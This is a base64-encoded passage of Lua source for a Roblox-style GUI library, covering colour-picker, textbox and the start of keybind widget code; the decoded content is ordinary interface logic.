2tlciIgXSwge1Bvc2l0aW9uID0gZGltMigwLCBzICogKGl0ZW1zWyAic2F0dXJhdGlvbl9ob2xkZXIiIF0uQWJzb2x1dGVTaXplLlggLSBpdGVtc1sgInNhdHZhbHBpY2tlciIgXS5BYnNvbHV0ZVNpemUuWCksIDEsIDEgLSB2ICogKGl0ZW1zWyAic2F0dXJhdGlvbl9ob2xkZXIiIF0uQWJzb2x1dGVTaXplLlkgLSBpdGVtc1sgInNhdHZhbHBpY2tlciIgXS5BYnNvbHV0ZVNpemUuWSkpfSwgRW51bS5FYXNpbmdTdHlsZS5MaW5lYXIsIDAuMDUpCgogICAgICAgICAgICAgICAgaXRlbXNbICJhbHBoYV9pbmRpY2F0b3IiIF06RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJVSUdyYWRpZW50IikuQ29sb3IgPSByZ2JzZXF7cmdia2V5KDAsIHJnYigxMTIsIDExMiwgMTEyKSksIHJnYmtleSgxLCBoc3YoaCwgMSwgMSkpfTsgLS0gc2hpdCBjb2RlCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAiY29sb3JwaWNrZXIiIF0uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yCiAgICAgICAgICAgICAgICBpdGVtc1sgImNvbG9ycGlja2VyX2lubGluZSIgXS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IKICAgICAgICAgICAgICAgIGl0ZW1zWyAic2F0dXJhdGlvbl9ob2xkZXIiIF0uQmFja2dyb3VuZENvbG9yMyA9IGhzdihoLCAxLCAxKQoKICAgICAgICAgICAgICAgIGl0ZW1zWyAiaHVlX3BpY2tlciIgXS5CYWNrZ3JvdW5kQ29sb3IzID0gaHN2KGgsIDEsIDEpCiAgICAgICAgICAgICAgICBpdGVtc1sgImFscGhhX3BpY2tlciIgXS5CYWNrZ3JvdW5kQ29sb3IzID0gaHN2KGgsIDEsIDEgLSBhKQogICAgICAgICAgICAgICAgaXRlbXNbICJzYXR2YWxwaWNrZXIiIF0uQmFja2dyb3VuZENvbG9yMyA9IGhzdihoLCBzLCB2KQoKICAgICAgICAgICAgICAgIGZsYWdzW2NmZy5mbGFnXSA9IHsKICAgICAgICAgICAgICAgICAgICBDb2xvciA9IENvbG9yOwogICAgICAgICAgICAgICAgICAgIFRyYW5zcGFyZW5jeSA9IGEgCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIGNvbG9yID0gaXRlbXNbICJjb2xvcnBpY2tlciIgXS5CYWNrZ3JvdW5kQ29sb3IzCiAgICAgICAgICAgICAgICBpdGVtc1sgImlucHV0IiBdLlRleHQgPSBzdHJpbmcuZm9ybWF0KCIlcywgJXMsICVzLCAiLCBsaWJyYXJ5OnJvdW5kKGNvbG9yLlIgKiAyNTUpLCBsaWJyYXJ5OnJvdW5kKGNvbG9yLkcgKiAyNTUpLCBsaWJyYXJ5OnJvdW5kKGNvbG9yLkIgKiAyNTUpKQogICAgICAgICAgICAgICAgaXRlbXNbICJpbnB1dCIgXS5UZXh0IC4uPSBsaWJyYXJ5OnJvdW5kKDEgLSBhLCAwLjAxKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjZmcuY2FsbGJhY2soQ29sb3IsIGEpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgZnVuY3Rpb24gY2ZnLnVwZGF0ZV9jb2xvcigpIAogICAgICAgICAgICAgICAgbG9jYWwgbW91c2UgPSB1aXM6R2V0TW91c2VMb2NhdGlvbigpIAogICAgICAgICAgICAgICAgbG9jYWwgb2Zmc2V0ID0gdmVjMihtb3VzZS5YLCBtb3VzZS5ZIC0gZ3VpX29mZnNldCkgCgogICAgICAgICAgICAgICAgaWYgZHJhZ2dpbmdfc2F0IHRoZW4JCiAgICAgICAgICAgICAgICAgICAgcyA9IG1hdGguY2xhbXAoKG9mZnNldCAtIGl0ZW1zWyJzYXQiXS5BYnNvbHV0ZVBvc2l0aW9uKS5YIC8gaXRlbXNbInNhdCJdLkFic29sdXRlU2l6ZS5YLCAwLCAxKQogICAgICAgICAgICAgICAgICAgIHYgPSAxIC0gbWF0aC5jbGFtcCgob2Zmc2V0IC0gaXRlbXNbInNhdCJdLkFic29sdXRlUG9zaXRpb24pLlkgLyBpdGVtc1sic2F0Il0uQWJzb2x1dGVTaXplLlksIDAsIDEpCiAgICAgICAgICAgICAgICBlbHNlaWYgZHJhZ2dpbmdfaHVlIHRoZW4KICAgICAgICAgICAgICAgICAgICBoID0gbWF0aC5jbGFtcCgob2Zmc2V0IC0gaXRlbXNbICJodWVfZ3JhZGllbnQiIF0uQWJzb2x1dGVQb3NpdGlvbikuWCAvIGl0ZW1zWyAiaHVlX2dyYWRpZW50IiBdLkFic29sdXRlU2l6ZS5YLCAwLCAxKQogICAgICAgICAgICAgICAgZWxzZWlmIGRyYWdnaW5nX2FscGhhIHRoZW4KICAgICAgICAgICAgICAgICAgICBhID0gMSAtIG1hdGguY2xhbXAoKG9mZnNldCAtIGl0ZW1zWyAiYWxwaGFfZ3JhZGllbnQiIF0uQWJzb2x1dGVQb3NpdGlvbikuWCAvIGl0ZW1zWyAiYWxwaGFfZ3JhZGllbnQiIF0uQWJzb2x1dGVTaXplLlgsIDAsIDEpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBjZmcuc2V0KCkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpdGVtc1sgImNvbG9ycGlja2VyIiBdLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgY2ZnLm9wZW4gPSBub3QgY2ZnLm9wZW4gCgogICAgICAgICAgICAgICAgY2ZnLnNldF92aXNpYmxlKGNmZy5vcGVuKSAgICAgICAgICAgIAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICB1aXMuSW5wdXRDaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgICAgICAgICBpZiAoZHJhZ2dpbmdfc2F0IG9yIGRyYWdnaW5nX2h1ZSBvciBkcmFnZ2luZ19hbHBoYSkgYW5kIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlTW92ZW1lbnQgdGhlbgogICAgICAgICAgICAgICAgICAgIGNmZy51cGRhdGVfY29sb3IoKSAKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBsaWJyYXJ5OmNvbm5lY3Rpb24odWlzLklucHV0RW5kZWQsIGZ1bmN0aW9uKGlucHV0KQogICAgICAgICAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VCdXR0b24xIHRoZW4KICAgICAgICAgICAgICAgICAgICBkcmFnZ2luZ19zYXQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGRyYWdnaW5nX2h1ZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgZHJhZ2dpbmdfYWxwaGEgPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkgICAgCgogICAgICAgICAgICBpdGVtc1sgImFscGhhX2dyYWRpZW50IiBdLk1vdXNlQnV0dG9uMURvd246Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBkcmFnZ2luZ19hbHBoYSA9IHRydWUgCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGl0ZW1zWyAiaHVlX2dyYWRpZW50IiBdLk1vdXNlQnV0dG9uMURvd246Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBkcmFnZ2luZ19odWUgPSB0cnVlIAogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICBpdGVtc1sgInNhdCIgXS5Nb3VzZUJ1dHRvbjFEb3duOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgZHJhZ2dpbmdfc2F0ID0gdHJ1ZSAgCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGl0ZW1zWyAiaW5wdXQiIF0uRm9jdXNMb3N0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbG9jYWwgdGV4dCA9IGl0ZW1zWyAiaW5wdXQiIF0uVGV4dAogICAgICAgICAgICAgICAgbG9jYWwgciwgZywgYiwgYSA9IGxpYnJhcnk6Y29udmVydCh0ZXh0KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiByIGFuZCBnIGFuZCBiIGFuZCBhIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgY2ZnLnNldChyZ2IociwgZywgYiksIDEgLSBhKQogICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBpdGVtc1sgImlucHV0IiBdLkZvY3VzZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiaW5wdXQiIF0sIHtUZXh0Q29sb3IzID0gcmdiKDI0NSwgMjQ1LCAyNDUpfSkKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgaXRlbXNbICJpbnB1dCIgXS5Gb2N1c0xvc3Q6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiaW5wdXQiIF0sIHtUZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzIpfSkKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgY2ZnLnNldChjZmcuY29sb3IsIGNmZy5hbHBoYSkKICAgICAgICAgICAgY29uZmlnX2ZsYWdzW2NmZy5mbGFnXSA9IGNmZy5zZXQKCiAgICAgICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoY2ZnLCBsaWJyYXJ5KQogICAgICAgIGVuZCAKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTp0ZXh0Ym94KG9wdGlvbnMpIAogICAgICAgICAgICBsb2NhbCBjZmcgPSB7CiAgICAgICAgICAgICAgICBuYW1lID0gb3B0aW9ucy5uYW1lIG9yICJUZXh0Qm94IiwKICAgICAgICAgICAgICAgIHBsYWNlaG9sZGVyID0gb3B0aW9ucy5wbGFjZWhvbGRlciBvciBvcHRpb25zLnBsYWNlaG9sZGVydGV4dCBvciBvcHRpb25zLmhvbGRlciBvciBvcHRpb25zLmhvbGRlcnRleHQgb3IgInR5cGUgaGVyZS4uLiIsCiAgICAgICAgICAgICAgICBkZWZhdWx0ID0gb3B0aW9ucy5kZWZhdWx0IG9yICIiLAogICAgICAgICAgICAgICAgZmxhZyA9IG9wdGlvbnMuZmxhZyBvciBsaWJyYXJ5Om5leHRfZmxhZygpLAogICAgICAgICAgICAgICAgY2FsbGJhY2sgPSBvcHRpb25zLmNhbGxiYWNrIG9yIGZ1bmN0aW9uKCkgZW5kLAogICAgICAgICAgICAgICAgdmlzaWJsZSA9IG9wdGlvbnMudmlzaWJsZSBvciB0cnVlLAogICAgICAgICAgICAgICAgaXRlbXMgPSB7fTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLmRlZmF1bHQKCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbyAKICAgICAgICAgICAgICAgIGl0ZW1zWyAidGV4dGJveCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgTGF5b3V0T3JkZXIgPSAtMTsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IHNlbGYuaXRlbXNbICJlbGVtZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWTsKICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE0OwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgIm5hbWUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5mb250OwogICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMjQ1LCAyNDUsIDI0NSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSBjZmcubmFtZTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInRleHRib3giIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlhZOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTY7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm5hbWUiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJyaWdodF9jb21wb25lbnRzIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJ0ZXh0Ym94IiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCA0LCAwLCAxOSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDAsIDEyKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJyaWdodF9jb21wb25lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmcgPSBkaW0oMCwgNyk7CiAgICAgICAgICAgICAgICAgICAgU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXI7CiAgICAgICAgICAgICAgICAgICAgRmlsbERpcmVjdGlvbiA9IEVudW0uRmlsbERpcmVjdGlvbi5Ib3Jpem9udGFsCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJpbnB1dCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJveCIgLCB7CiAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5mb250OwogICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgVGV4dFRydW5jYXRlID0gRW51bS5UZXh0VHJ1bmNhdGUuQXRFbmQ7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBQbGFjZWhvbGRlckNvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KTsKICAgICAgICAgICAgICAgICAgICBDdXJzb3JQb3NpdGlvbiA9IC0xOwogICAgICAgICAgICAgICAgICAgIENsZWFyVGV4dE9uRm9jdXMgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE0OwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSk7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYig3MiwgNzIsIDcyKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC00LCAwLCAzMCk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigzMywgMzMsIDM1KQogICAgICAgICAgICAgICAgfSk7IAoKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaW5wdXQiIF07CiAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDMpCiAgICAgICAgICAgICAgICB9KTsgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1RvcCA9IGRpbSgwLCA0KTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgNCkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICBlbmQgCiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBjZmcuc2V0KHRleHQpIAogICAgICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gdGV4dAoKICAgICAgICAgICAgICAgIGl0ZW1zWyAiaW5wdXQiIF0uVGV4dCA9IHRleHQKCiAgICAgICAgICAgICAgICBjZmcuY2FsbGJhY2sodGV4dCkKICAgICAgICAgICAgZW5kIAogICAgICAgICAgICAKICAgICAgICAgICAgaXRlbXNbICJpbnB1dCIgXTpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoIlRleHQiKTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGNmZy5zZXQoaXRlbXNbICJpbnB1dCIgXS5UZXh0KSAKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgaXRlbXNbICJpbnB1dCIgXS5Gb2N1c2VkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgImlucHV0IiBdLCB7VGV4dENvbG9yMyA9IHJnYigyNDUsIDI0NSwgMjQ1KX0pCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGl0ZW1zWyAiaW5wdXQiIF0uRm9jdXNMb3N0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgImlucHV0IiBdLCB7VGV4dENvbG9yMyA9IHJnYig3MiwgNzIsIDcyKX0pCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICBpZiBjZmcuZGVmYXVsdCB0aGVuIAogICAgICAgICAgICAgICAgY2ZnLnNldChjZmcuZGVmYXVsdCkgCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgY29uZmlnX2ZsYWdzW2NmZy5mbGFnXSA9IGNmZy5zZXQKCiAgICAgICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoY2ZnLCBsaWJyYXJ5KQogICAgICAgIGVuZAoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OmtleWJpbmQob3B0aW9ucykgCiAgICAgICAgICAgIGxvY2FsIGNmZyA9IHsKICAgICAgICAgICAgICAgIGZsYWcgPSBvcHRpb25zLmZsYWcgb3IgbGlicmFyeTpuZXh0X2ZsYWcoKSwKICAgICAgICAgICAgICAgIGNhbGxiYWNrID0gb3B0aW9ucy5jYWxsYmFjayBvciBmdW5jdGlvbigpIGVuZCwKICAgICAgICAgICAgICAgIG5hbWUgPSBvcHRpb25zLm5hbWUgb3IgbmlsLCAKICAgICAgICAgICAgICAgIGlnbm9yZV9rZXkgPSBvcHRpb25zLmlnbm9yZSBvciBmYWxzZSwgCiAgICAgICAgICAgICAgICBzZXBlcmF0b3IgPSBvcHRpb25zLnNlcGVyYXRvciBvciBmYWxzZSwKCiAgICAgICAgICAgICAgICBrZXkgPSBvcHRpb25zLmtleSBvciBuaWwsIAogICAgICAgICAgICAgICAgbW9kZSA9IG9wdGlvbnMubW9kZSBvciAiVG9nZ2xlIiwKICAgICAgICAgICAgICAgIGFjdGl2ZSA9IG9wdGlvbnMuZGVmYXVsdCBvciBmYWxzZSwgCgogICAgICAgICAgICAgICAgb3BlbiA9IGZhbHNlLAogICAgICAgICAgICAgICAgYmluZGluZyA9IG5pbCwgCgogICAgICAgICAgICAgICAgaG9sZF9pbnN0YW5jZXMgPSB7fSwKICAgICAgICAgICAgICAgIGl0ZW1zID0ge307CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZsYWdzW2NmZy5mbGFnXSA9IHsKICAgICAgICAgICAgICAgIG1vZGUgPSBjZmcubW9kZSwKICAgICAgICAgICAgICAgIGtleSA9IGNmZy5rZXksIAogICAgICAgICAgICAgICAgYWN0aXZlID0gY2ZnLmFjdGl2ZQogICAgICAgICAgICB9CgogICAgICAgICAgICBsb2NhbCBpdGVtcyA9IGNmZy5pdGVtczsgZG8gCiAgICAgICAgICAgICAgICAtLSBDb21wb25lbnQKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImtleWJpbmRfZWxlbWVudCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IHNlbGYuaXRlbXNbICJlbGVtZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE0OwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJuYW1lIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMjQ1LCAyNDUsIDI0NSk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5uYW1lOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImtleWJpbmRfZWxlbWVudCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTY7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibmFtZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCA1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImtleWJpbmRfZWxlbWVudCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlMaXN0TGF5b3V0IiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgRmlsbERpcmVjdGlvbiA9IEVudW0uRmlsbERpcmVjdGlvbi5Ib3Jpem9udGFsOwogICAgICAgICAgICAgICAgICAgICAgICBIb3Jpem9udGFsQWxpZ25tZW50ID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LlJpZ2h0OwogICAgICAgICAgICAgICAg